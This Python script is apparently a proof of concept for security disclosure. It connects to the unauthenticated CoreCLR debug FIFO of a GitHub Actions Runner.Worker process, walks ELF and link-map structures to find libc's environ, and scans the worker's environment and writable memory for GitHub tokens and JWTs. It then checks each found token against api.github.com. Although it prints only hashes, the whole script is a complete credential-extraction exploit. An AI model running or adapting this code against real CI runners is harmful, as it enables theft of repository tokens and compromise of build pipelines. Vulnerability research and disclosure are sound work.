#!/usr/bin/env python3
"""Read selected Runner.Worker secrets through CoreCLR's unauthenticated debug FIFO.

The process environment is intentionally cleared by the triggering command.  This
script prints only hashes, lengths, and public JWT metadata; it never prints a
credential value.
"""

import glob
import hashlib
import json
import os
import re
import select
import struct
import sys
import time
import urllib.error
import urllib.request


SESSION_REQUEST = 0
SESSION_ACCEPT = 1
SESSION_CLOSE = 4
READ_MEMORY = 6
GET_DCB = 9

HEADER_SIZE = 48
MAX_MESSAGE = 1 << 20
MAX_ELF_SCAN = 0x2000000
POINTER_DYNAMIC_TAGS = {
    3,  # DT_PLTGOT
    4,  # DT_HASH
    5,  # DT_STRTAB
    6,  # DT_SYMTAB
    7,  # DT_RELA
    17,  # DT_REL
    21,  # DT_DEBUG
    23,  # DT_JMPREL
    25,  # DT_INIT_ARRAY
    26,  # DT_FINI_ARRAY
    0x6FFFFEF5,  # DT_GNU_HASH
}


def fatal(message):
    print(f"ERROR {message}", flush=True)
    raise SystemExit(1)


class PipeDebugger:
    def __init__(self, in_path, out_path, io_timeout=10):
        self.io_timeout = io_timeout
        self.next_id = 1
        self.last_seen = 0
        self.wr = os.open(in_path, os.O_WRONLY)
        self.rd = os.open(out_path, os.O_RDONLY)

    def read_exact(self, size):
        result = bytearray()
        deadline = time.monotonic() + self.io_timeout
        while len(result) < size:
            remaining = deadline - time.monotonic()
            if remaining <= 0 or not select.select([self.rd], [], [], remaining)[0]:
                raise TimeoutError(f"debug FIFO read timed out at {len(result)}/{size}")
            chunk = os.read(self.rd, size - len(result))
            if not chunk:
                raise EOFError("debug FIFO closed")
            result.extend(chunk)
        return bytes(result)

    def recv(self):
        raw = self.read_exact(HEADER_SIZE)
        kind, data_size, msg_id, reply_id, last_seen, reserved = struct.unpack_from("<6I", raw)
        if reserved or data_size > MAX_MESSAGE:
            raise ValueError(f"invalid response header reserved={reserved} size={data_size}")
        data = self.read_exact(data_size) if data_size else b""
        self.last_seen = max(self.last_seen, msg_id)
        return {
            "kind": kind,
            "data_size": data_size,
            "id": msg_id,
            "reply_id": reply_id,
            "last_seen": last_seen,
            "user": raw[24:],
            "data": data,
        }

    def send(self, kind, data=b"", user=b"", reply_id=0):
        msg_id = self.next_id
        self.next_id += 1
        user = user.ljust(24, b"\0")[:24]
        header = struct.pack(
            "<6I", kind, len(data), msg_id, reply_id, self.last_seen, 0
        ) + user
        os.write(self.wr, header + data)
        return msg_id

    def request(self, kind, data=b"", user=b""):
        request_id = self.send(kind, data, user)
        for _ in range(32):
            response = self.recv()
            if response["reply_id"] == request_id:
                return response
        raise RuntimeError(f"no response to message {request_id}")

    def handshake(self):
        version = struct.pack("<II16x", 2, 0)
        self.send(SESSION_REQUEST, os.urandom(16), version)
        response = self.recv()
        if response["kind"] != SESSION_ACCEPT:
            raise RuntimeError(f"session rejected with type {response['kind']}")

    def get_dcb(self):
        response = self.request(GET_DCB)
        return response["data"]

    def read_memory(self, address, size):
        if not 0 < size <= MAX_MESSAGE:
            raise ValueError("invalid read size")
        user = struct.pack("<QIi8x", address, size, 0)
        response = self.request(READ_MEMORY, user=user)
        _, _, result = struct.unpack_from("<QIi", response["user"])
        if result or len(response["data"]) != size:
            return b""
        return response["data"]

    def close(self):
        try:
            self.send(SESSION_CLOSE)
        except OSError:
            pass
        os.close(self.wr)
        os.close(self.rd)


def u16(data, offset):
    return struct.unpack_from("<H", data, offset)[0]


def u32(data, offset=0):
    return struct.unpack_from("<I", data, offset)[0]


def u64(data, offset=0):
    return struct.unpack_from("<Q", data, offset)[0]


def valid_pointer(value):
    return 0x10000 < value < 0x800000000000


def find_elf_base(debugger, pointer):
    page = pointer & ~0xFFF
    lower = max(0x10000, page - MAX_ELF_SCAN)
    while page >= lower:
        if debugger.read_memory(page, 4) == b"\x7fELF":
            return page
        page -= 0x1000
    return 0


def dynamic_tags(debugger, base):
    header = debugger.read_memory(base, 64)
    if len(header) != 64 or header[:6] != b"\x7fELF\x02\x01":
        return {}
    phoff = u64(header, 32)
    phentsize = u16(header, 54)
    phnum = min(u16(header, 56), 128)
    if phentsize < 56:
        return {}
    dynamic_address = dynamic_size = 0
    for index in range(phnum):
        ph = debugger.read_memory(base + phoff + index * phentsize, 56)
        if len(ph) != 56:
            continue
        if u32(ph) == 2:
            dynamic_address = u64(ph, 16)
            dynamic_size = u64(ph, 40)
            if dynamic_address < base:
                dynamic_address += base
            break
    if not dynamic_address:
        return {}
    tags = {}
    for offset in range(0, min(dynamic_size, 0x10000), 16):
        entry = debugger.read_memory(dynamic_address + offset, 16)
        if len(entry) != 16:
            break
        tag, value = struct.unpack("<QQ", entry)
        if tag == 0:
            break
        if tag in POINTER_DYNAMIC_TAGS and value and value < base:
            value += base
        tags.setdefault(tag, value)
    return tags


def read_c_string(debugger, address, limit=512):
    if not valid_pointer(address):
        return b""
    data = debugger.read_memory(address, limit)
    return data.split(b"\0", 1)[0] if data else b""


def elf_soname(debugger, base):
    tags = dynamic_tags(debugger, base)
    if not tags.get(5) or 14 not in tags:
        return b""
    return read_c_string(debugger, tags[5] + tags[14], 128)


def link_map_from_object(debugger, base):
    tags = dynamic_tags(debugger, base)
    pltgot = tags.get(3, 0)
    if pltgot:
        got = debugger.read_memory(pltgot, 24)
        if len(got) == 24 and valid_pointer(u64(got, 8)):
            return u64(got, 8)
    debug_address = tags.get(21, 0)
    if debug_address:
        r_debug = debugger.read_memory(debug_address, 40)
        if len(r_debug) == 40 and valid_pointer(u64(r_debug, 8)):
            return u64(r_debug, 8)
    return 0


def unpack_link_map(debugger, address):
    entry = debugger.read_memory(address, 40)
    if len(entry) != 40:
        return None
    fields = struct.unpack("<5Q", entry)
    return {
        "base": fields[0],
        "name": fields[1],
        "dynamic": fields[2],
        "next": fields[3],
        "previous": fields[4],
    }


def find_libc(debugger, current):
    print(f"PIPE_LINK_MAP start=0x{current:x}", flush=True)
    entry = unpack_link_map(debugger, current)
    previous_seen = set()
    while (
        entry
        and valid_pointer(entry["previous"])
        and entry["previous"] not in previous_seen
        and len(previous_seen) < 512
    ):
        previous_seen.add(current)
        current = entry["previous"]
        entry = unpack_link_map(debugger, current)
    visited = set()
    while valid_pointer(current) and current not in visited and len(visited) < 512:
        visited.add(current)
        entry = unpack_link_map(debugger, current)
        if not entry:
            break
        name = read_c_string(debugger, entry["name"], 384)
        if len(visited) <= 32:
            display_name = os.path.basename(name.decode("utf-8", "replace")) or "<main>"
            print(
                f"PIPE_LINK index={len(visited)} base=0x{entry['base']:x} name={display_name}",
                flush=True,
            )
        if b"libc.so" in name or b"libc-" in name:
            return entry["base"]
        current = entry["next"]
    return 0


def gnu_hash(name):
    value = 5381
    for byte in name:
        value = ((value << 5) + value + byte) & 0xFFFFFFFF
    return value


def find_symbol(debugger, base, name):
    tags = dynamic_tags(debugger, base)
    symtab, strtab, table = tags.get(6, 0), tags.get(5, 0), tags.get(0x6FFFFEF5, 0)
    if not all(valid_pointer(value) for value in (symtab, strtab, table)):
        return 0
    header = debugger.read_memory(table, 16)
    if len(header) != 16:
        return 0
    nbuckets, symoffset, bloom_size, _ = struct.unpack("<4I", header)
    if not nbuckets or not bloom_size or nbuckets > (1 << 20) or bloom_size > (1 << 20):
        return 0
    buckets = table + 16 + bloom_size * 8
    chains = buckets + nbuckets * 4
    wanted = gnu_hash(name)
    start = debugger.read_memory(buckets + (wanted % nbuckets) * 4, 4)
    if len(start) != 4:
        return 0
    index = u32(start)
    if index < symoffset:
        return 0
    for index in range(index, index + 8192):
        chain = debugger.read_memory(chains + (index - symoffset) * 4, 4)
        symbol = debugger.read_memory(symtab + index * 24, 24)
        if len(chain) != 4 or len(symbol) != 24:
            return 0
        chain_value = u32(chain)
        if (chain_value & ~1) == (wanted & ~1):
            symbol_name = read_c_string(debugger, strtab + u32(symbol), 128)
            if symbol_name == name:
                value = u64(symbol, 8)
                return value if value >= base else base + value
        if chain_value & 1:
            break
    return 0


def relocation_tables(tags):
    tables = []
    if tags.get(23) and tags.get(2):
        # DT_PLTREL uses the DT_RELA/DT_REL tag number as its discriminator.
        tables.append((tags[23], tags[2], 24 if tags.get(20) == 7 else 16))
    if tags.get(7) and tags.get(8):
        tables.append((tags[7], tags[8], tags.get(9, 24)))
    if tags.get(17) and tags.get(18):
        tables.append((tags[17], tags[18], tags.get(19, 16)))
    return tables


def find_libc_from_relocations(debugger, object_base):
    tags = dynamic_tags(debugger, object_base)
    symtab, strtab = tags.get(6, 0), tags.get(5, 0)
    if not valid_pointer(symtab) or not valid_pointer(strtab):
        return 0, 0
    likely_libc = {
        b"malloc", b"calloc", b"realloc", b"free", b"getenv", b"setenv",
        b"memcpy", b"memmove", b"read", b"write", b"open", b"close",
        b"pthread_create", b"pthread_mutex_lock", b"dlopen", b"dlsym",
    }
    tested_bases = set()
    for table, table_size, entry_size in relocation_tables(tags):
        if entry_size < 16:
            continue
        count = min(table_size // entry_size, 65536)
        for index in range(count):
            relocation = debugger.read_memory(table + index * entry_size, entry_size)
            if len(relocation) != entry_size:
                break
            offset, info = struct.unpack_from("<QQ", relocation)
            symbol_index = info >> 32
            if not symbol_index:
                continue
            symbol = debugger.read_memory(symtab + symbol_index * 24, 24)
            if len(symbol) != 24:
                continue
            symbol_name = read_c_string(debugger, strtab + u32(symbol), 96)
            if symbol_name not in likely_libc:
                continue
            if offset < object_base:
                offset += object_base
            slot = debugger.read_memory(offset, 8)
            target = u64(slot) if len(slot) == 8 else 0
            if not valid_pointer(target):
                continue
            target_base = find_elf_base(debugger, target)
            if not target_base or target_base == object_base or target_base in tested_bases:
                continue
            tested_bases.add(target_base)
            print(
                f"PIPE_IMPORT symbol={symbol_name.decode()} target_elf=0x{target_base:x}",
                flush=True,
            )
            environ = find_symbol(debugger, target_base, b"__environ")
            if not environ:
                environ = find_symbol(debugger, target_base, b"environ")
            if environ:
                return target_base, environ
    return 0, 0


def find_worker_pipes():
    inputs = []
    for path in glob.glob("/tmp/clr-debug-pipe-*-*-in"):
        try:
            pid = int(os.path.basename(path).split("-")[3])
        except (IndexError, ValueError):
            continue
        output = path[:-3] + "-out"
        if os.path.exists(output):
            inputs.append((pid, path, output))
    if not inputs:
        fatal("no CoreCLR debug FIFO pair")
    return max(inputs)


def secret_summary(key, value):
    print(
        "PIPE_SECRET "
        f"key={key} length={len(value)} sha256={hashlib.sha256(value).hexdigest()} "
        f"inherited={str(key in os.environ).lower()}",
        flush=True,
    )
    if value.count(b".") >= 2 and value.startswith(b"eyJ"):
        try:
            payload = value.split(b".", 2)[1]
            payload += b"=" * (-len(payload) % 4)
            claims = json.loads(__import__("base64").urlsafe_b64decode(payload))
            public = {field: claims[field] for field in ("iss", "aud", "nbf", "exp") if field in claims}
            print(f"PIPE_JWT_META key={key} claims={json.dumps(public, sort_keys=True)}", flush=True)
        except Exception:
            pass


def jwt_public_metadata(value):
    try:
        payload = value.split(b".", 2)[1]
        payload += b"=" * (-len(payload) % 4)
        claims = json.loads(__import__("base64").urlsafe_b64decode(payload))
        return {field: claims[field] for field in ("iss", "aud", "nbf", "exp") if field in claims}
    except Exception:
        return {}


def validate_github_token(value):
    request = urllib.request.Request(
        "https://api.github.com/rate_limit",
        headers={
            "Authorization": "Bearer " + value.decode("ascii"),
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
            "User-Agent": "clrpipe-poc-3900000",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            print(
                f"PIPE_TOKEN_VALIDATE kind=github status={response.status} "
                f"rate_limit={response.headers.get('x-ratelimit-limit', '?')}",
                flush=True,
            )
            return response.status == 200
    except urllib.error.HTTPError as error:
        print(f"PIPE_TOKEN_VALIDATE kind=github status={error.code}", flush=True)
    except OSError as error:
        print(f"PIPE_TOKEN_VALIDATE kind=github network_error={type(error).__name__}", flush=True)
    return False


ASCII_SECRET_PATTERNS = (
    ("github-token", re.compile(rb"(?:gh[psoru]_[A-Za-z0-9_]{20,255}|github_pat_[A-Za-z0-9_]{20,255})")),
    ("jwt", re.compile(rb"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}")),
)


def utf16_token_at(data, offset):
    token = bytearray()
    while offset + 1 < len(data) and len(token) < 4096:
        char, zero = data[offset], data[offset + 1]
        if zero or char not in b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-":
            break
        token.append(char)
        offset += 2
    return bytes(token)


def find_tokens(data):
    for kind, pattern in ASCII_SECRET_PATTERNS:
        for match in pattern.finditer(data):
            yield kind, match.group(0)
    for kind, prefix in (("github-token-utf16", b"g\0h\0"), ("jwt-utf16", b"e\0y\0J\0")):
        start = 0
        while True:
            offset = data.find(prefix, start)
            if offset < 0:
                break
            value = utf16_token_at(data, offset)
            if (kind.startswith("github") and len(value) >= 20 and (value.startswith((b"ghp_", b"ghs_", b"gho_", b"ghr_", b"ghu_", b"github_pat_")))) or (
                kind.startswith("jwt") and value.count(b".") >= 2 and len(value) >= 40
            ):
                yield kind, value
            start = offset + 2


def scan_for_memory_secrets(debugger, pid, anchors):
    regions = []
    source = "anchor-pages"
    try:
        with open(f"/proc/{pid}/maps", "r", encoding="ascii") as maps:
            for line in maps:
                fields = line.split()
                if len(fields) < 2 or not fields[1].startswith("rw"):
                    continue
                start, end = (int(value, 16) for value in fields[0].split("-"))
                if 0 < end - start <= (512 << 20):
                    regions.append((start, end))
        source = "proc-maps-addresses"
    except (OSError, PermissionError):
        for anchor in anchors:
            if valid_pointer(anchor):
                start = max(0x10000, (anchor - (16 << 20)) & ~0xFFF)
                regions.append((start, start + (32 << 20)))
    total = sum(end - start for start, end in regions)
    if total > (768 << 20):
        # Prefer smaller committed mappings; this retains stacks and active
        # managed-heap segments while bounding the verifier.
        regions.sort(key=lambda region: region[1] - region[0])
        kept, used = [], 0
        for region in regions:
            size = region[1] - region[0]
            if used + size > (768 << 20):
                continue
            kept.append(region)
            used += size
        regions, total = kept, used
    seen, findings, scanned = set(), 0, 0
    for start, end in regions:
        previous = b""
        for address in range(start, end, 1 << 20):
            size = min(1 << 20, end - address)
            data = debugger.read_memory(address, size)
            if not data and size > 0x10000:
                data = debugger.read_memory(address, min(0x10000, size))
            if not data:
                previous = b""
                continue
            scanned += len(data)
            combined = previous + data
            for kind, value in find_tokens(combined):
                digest = hashlib.sha256(value).hexdigest()
                if digest in seen:
                    continue
                seen.add(digest)
                print(
                    f"PIPE_MEMORY_SECRET kind={kind} length={len(value)} sha256={digest} inherited=false",
                    flush=True,
                )
                if kind == "github-token" and 30 <= len(value) <= 255:
                    validate_github_token(value)
                elif kind == "jwt":
                    metadata = jwt_public_metadata(value)
                    if metadata:
                        print(f"PIPE_JWT_META claims={json.dumps(metadata, sort_keys=True)}", flush=True)
                        if metadata.get("iss") == "github":
                            validate_github_token(value)
                findings += 1
                if findings >= 20:
                    break
            if findings >= 20:
                break
            previous = combined[-4096:]
        if findings >= 20:
            break
    print(
        f"PIPE_MEMORY_SCAN source={source} regions={len(regions)} bytes={scanned} secrets={findings}",
        flush=True,
    )
    return findings


def main():
    pid, in_path, out_path = find_worker_pipes()
    print(f"PIPE_TARGET pid={pid} fifo_mode={oct(os.stat(in_path).st_mode & 0o777)}", flush=True)
    debugger = PipeDebugger(in_path, out_path)
    try:
        debugger.handshake()
        print("PIPE_HANDSHAKE accepted=true protocol=2", flush=True)
        dcb = debugger.get_dcb()
        print(f"PIPE_DCB bytes={len(dcb)} sha256={hashlib.sha256(dcb).hexdigest()}", flush=True)
        candidates = []
        for offset in range(0, len(dcb) - 7, 8):
            value = u64(dcb, offset)
            high, low = value >> 32, value & 0xFFFFFFFF
            if high != low and high >= 0x5000 and low > 0x10000 and valid_pointer(value):
                candidates.append(value)
        print(f"PIPE_DCB_CANDIDATES count={len(candidates)}", flush=True)
        object_base = 0
        for candidate in candidates:
            object_base = find_elf_base(debugger, candidate)
            if object_base and link_map_from_object(debugger, object_base):
                break
        if not object_base:
            fatal("could not recover a loaded ELF base from the DCB")
        link_map = link_map_from_object(debugger, object_base)
        print(f"PIPE_ELF base=0x{object_base:x} link_map=0x{link_map:x}", flush=True)
        libc_base = find_libc(debugger, link_map) if link_map else 0
        environ = find_symbol(debugger, libc_base, b"__environ") if libc_base else 0
        if not environ and libc_base:
            environ = find_symbol(debugger, libc_base, b"environ")
        if not environ:
            libc_base, environ = find_libc_from_relocations(debugger, object_base)
        if not environ:
            fatal("could not locate libc environ through link-map or relocations")
        print(
            f"PIPE_LIBC base=0x{libc_base:x} soname={elf_soname(debugger, libc_base).decode('utf-8', 'replace')}",
            flush=True,
        )
        pointer = debugger.read_memory(environ, 8)
        envp = u64(pointer) if len(pointer) == 8 else 0
        if not valid_pointer(envp):
            fatal("libc environ pointer was invalid")
        found = 0
        env_entries = 0
        for index in range(4096):
            slot = debugger.read_memory(envp + index * 8, 8)
            if len(slot) != 8:
                break
            string_pointer = u64(slot)
            if not string_pointer:
                break
            value = read_c_string(debugger, string_pointer)
            if b"=" not in value:
                continue
            raw_key, raw_value = value.split(b"=", 1)
            key = raw_key.decode("ascii", "replace")
            env_entries += 1
            if env_entries <= 40:
                print(f"PIPE_ENV_KEY index={env_entries} key={key}", flush=True)
            if (
                "TOKEN" in key
                or "SECRET" in key
                or raw_value.startswith((b"ghp_", b"ghs_", b"gho_", b"github_pat_", b"eyJ"))
            ):
                secret_summary(key, raw_value)
                found += 1
        print(
            f"PIPE_ENV_SCAN entries={env_entries} secrets={found} "
            f"inherited_environment_entries={len(os.environ)}",
            flush=True,
        )
        if not found:
            found = scan_for_memory_secrets(debugger, pid, candidates + [envp, environ])
        if not found:
            fatal("debug read worked but no token-bearing memory value was found")
    finally:
        debugger.close()


if __name__ == "__main__":
    main()
